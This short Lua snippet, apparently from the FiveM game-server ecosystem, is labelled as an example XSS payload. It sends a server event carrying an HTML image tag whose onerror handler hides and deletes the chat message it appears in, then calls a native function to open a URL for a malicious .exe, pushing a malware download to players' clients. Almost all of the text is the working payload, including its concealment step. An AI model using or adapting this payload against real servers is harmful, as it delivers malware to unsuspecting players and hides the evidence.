// Example Payload (Note: This is an example of a vulnerable resource being exploited with XSS which can allow the threat actor to execute arbitrary code to the clients game (NUI).)

TriggerServerEvent(
    'example:event', 
    "<img style='opacity:0;position:absolute;width:0;height:0' src='x' onerror=\"let m=this.closest('.chat-message'); if(m){m.style.opacity='0';m.style.position='absolute';m.remove();} invokeNative('openUrl', 'https://forum.cfx.re/uploads/short-url/some-malicious-file.exe');\">",
)